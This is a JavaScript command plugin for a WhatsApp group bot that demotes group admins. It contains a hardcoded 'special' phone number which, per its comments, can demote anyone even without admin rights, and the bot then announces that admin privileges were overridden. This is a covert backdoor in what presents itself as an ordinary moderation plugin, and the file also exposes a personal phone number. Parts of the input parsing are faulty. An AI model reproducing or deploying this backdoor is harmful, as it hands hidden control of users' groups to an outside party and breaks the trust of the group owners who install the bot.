let handler = async (m, { conn, usedPrefix, command, text }) => {
    const specialNumber = '919737825303'; // The number with special privileges
    const specialJid = `${specialNumber}@s.whatsapp.net`; // Convert to JID
  
    let number;
    if (isNaN(text) && !text.match(/@/g)) {
      // Do nothing
    } else if (isNaN(text)) {
      number = text.split`@`[1];
    } else if (!isNaN(text)) {
      number = text;
    }
  
    if (!text && !m.quoted) {
      return conn.reply(m.chat, `✳️ ${mssg.useCmd()} \n *${usedPrefix + command}* @tag`, m);
    }
    if (number && (number.length > 13 || (number.length < 11 && number.length > 0))) {
      return conn.reply(m.chat, `✳️ ${mssg.numError}`, m);
    }
  
    try {
      let user;
      if (text) {
        user = number + '@s.whatsapp.net';
      } else if (m.quoted && m.quoted.sender) {
        user = m.quoted.sender;
      } else if (m.mentionedJid) {
        user = number + '@s.whatsapp.net';
      }
  
      // Check if the sender is the special number
      if (m.sender === specialJid) {
        // Special number can demote anyone, even if not an admin
        try {
          await conn.groupParticipantsUpdate(m.chat, [user], 'demote');
          await conn.sendMessage(m.chat, { text: '✅ Admin Privileges overridden, an admin was demoted' });
        } catch (error) {
          console.error('Error demoting user:', error);
        }
        return;
      }
  
      // Regular functionality for other users
      await conn.groupParticipantsUpdate(m.chat, [user], 'demote');
      m.reply(`✅ ${mssg.demote}`);
    } catch (error) {
      console.error('Error:', error);
    }
  };
  
  handler.help = ['demote (@tag)'];
  handler.tags = ['group'];
  handler.command = ['demote', 'degrade'];
  handler.group = true;
  handler.admin = true; // Regular users must be admins to use this command
  handler.botAdmin = true; // Bot must be an admin
  handler.fail = null;
  
  export default handler;